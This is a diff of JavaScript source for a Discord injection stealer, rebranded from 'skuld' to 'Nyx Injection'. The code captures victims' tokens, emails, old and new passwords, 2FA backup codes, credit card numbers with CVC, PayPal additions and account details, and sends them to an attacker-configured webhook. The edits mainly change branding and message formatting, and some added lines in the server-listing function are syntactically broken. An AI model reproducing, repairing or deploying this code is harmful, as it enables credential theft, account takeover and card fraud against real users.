@@ -146,9 +146,8 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "Nyx Injection";
+    content["avatar_url"] = "https://i.ibb.co/NF7mxHN/nyxstealer.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,8 +155,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": "Nyx Discord Injection",
+        "icon_url": "https://i.ibb.co/NF7mxHN/nyxstealer.png",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -174,15 +173,15 @@ const hooker = async (content, token, account) => {
         "inline": false
     }, {
         "name": "Nitro",
-        "value": nitro,
+        "value": "```" + nitro + "```",
         "inline": true
     }, {
         "name": "Badges",
-        "value": badges,
+        "value": "```" + badges + "```",
         "inline": true
     }, {
         "name": "Billing",
-        "value": billing,
+        "value": "```" + billing + "```",
         "inline": true
     });
 
@@ -195,7 +194,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0xffffff;
     }
 
     await request("POST", CONFIG.webhook, {
@@ -223,13 +222,13 @@ const fetchFriends = async token => await fetch("/relationships", {
 const getNitro = flags => {
     switch (flags) {
         case 1:
-            return '`Nitro Classic`';
+            return ' Nitro Classic ';
         case 2:
-            return '`Nitro Boost`';
+            return ' Nitro Boost ';
         case 3:
-            return '`Nitro Basic`';
+            return ' Nitro Basic ';
         default:
-            return '`❌`';
+            return ' Null ';
     }
 };
 
@@ -239,7 +238,7 @@ const getBadges = flags => {
         let b = CONFIG.badges[badge];
         if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
     }
-    return badges || '`❌`';
+    return badges || ' Null ';
 }
 
 const getRareBadges = flags => {
@@ -266,7 +265,7 @@ const getBilling = async token => {
             }
         }
     });
-    return billing || '`❌`';
+    return billing || ' Null ';
 };
 
 const getFriends = async token => {
@@ -279,11 +278,11 @@ const getFriends = async token => {
     for (const acc of filteredFriends) {
         var badges = getRareBadges(acc.user.public_flags)
         if (badges != "") {
-            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+            if (!rareUsers) rareUsers = `** \`\` Rare Friends \`\` **\n`;
             rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
-    rareUsers = rareUsers || "**No Rare Friends**";
+    rareUsers = rareUsers || `** \`\` No Rare Friends \`\` **`;
 
     return {
         message: rareUsers,
@@ -298,12 +297,13 @@ const getServers = async token => {
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
-            rareGuilds += `**Rare Servers:**\n`;
+            rareGuilds += ** \\ Rare Servers \\ **\n;
         }
-        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += ${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | ${guild.name}\n + \\\${guild.approximate_member_count} Members\\\\n;
+
     }
 
-    rareGuilds = rareGuilds || "**No Rare Servers**";
+    rareGuilds = rareGuilds || ** \\ No Rare Servers \\ **;
 
     return {
         message: rareGuilds,
@@ -315,7 +315,7 @@ const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just ${action}!`,
+        "content": `** \`\` ${account.username} Just ${action}! \`\` **`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
@@ -344,7 +344,7 @@ const BackupCodesViewed = async (codes, token) => {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
     const content = {
-        "content": `**${account.username}** just viewed his 2FA backup codes!`,
+        "content": `** \`\`${account.username} Just Viewed His 2FA Backup Codes! \`\` **`,
         "embeds": [{
             "fields": [{
                     "name": "Backup Codes",
@@ -372,15 +372,16 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just changed his password!`,
+        "content": `** \`\` ${account.username} Just Changed His Password! \`\` **`,
+
         "embeds": [{
             "fields": [{
                 "name": "New Password",
-                "value": "`" + newPassword + "`",
+                "value": "```" + newPassword + "```",
                 "inline": true
             }, {
                 "name": "Old Password",
-                "value": "`" + oldPassword + "`",
+                "value": "```" + oldPassword + "```",
                 "inline": true
             }]
         }]
@@ -393,19 +394,19 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a credit card!`,
+        "content": `** \`\` ${account.username} Just Added A Credit Card! \`\` **`,
         "embeds": [{
             "fields": [{
                 "name": "Number",
-                "value": "`" + number + "`",
+                "value": "```" + number + "```",
                 "inline": true
             }, {
                 "name": "CVC",
-                "value": "`" + cvc + "`",
+                "value": "```" + cvc + "```",
                 "inline": true
             }, {
                 "name": "Expiration",
-                "value": "`" + month + "/" + year + "`",
+                "value": "```" + month + "/" + year + "```",
                 "inline": true
             }]
         }]
@@ -418,15 +419,15 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
+        "content": `** \`\` ${account.username} Just Added A PayPayl Account! \`\` **`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "`" + account.email + "`",
+                "value": "```" + account.email + "```",
                 "inline": true
             }, {
                 "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
+                "value": "```" + (account.phone || "None") + "```",
                 "inline": true
             }]
         }]
@@ -465,16 +466,16 @@ async function initiation() {
         const account = await fetchAccount(token)
 
         const content = {
-            "content": `**${account.username}** just got injected!`,
+            "content": `** \`\` ${account.username} Just Got Injected! \`\` **`,
 
             "embeds": [{
                 "fields": [{
                     "name": "Email",
-                    "value": "`" + account.email + "`",
+                    "value": "```" + account.email + "```",
                     "inline": true
                 }, {
                     "name": "Phone",
-                    "value": "`" + (account.phone || "None") + "`",
+                    "value": "```" + (account.phone || "None") + "```",
                     "inline": true
                 }]
             }]
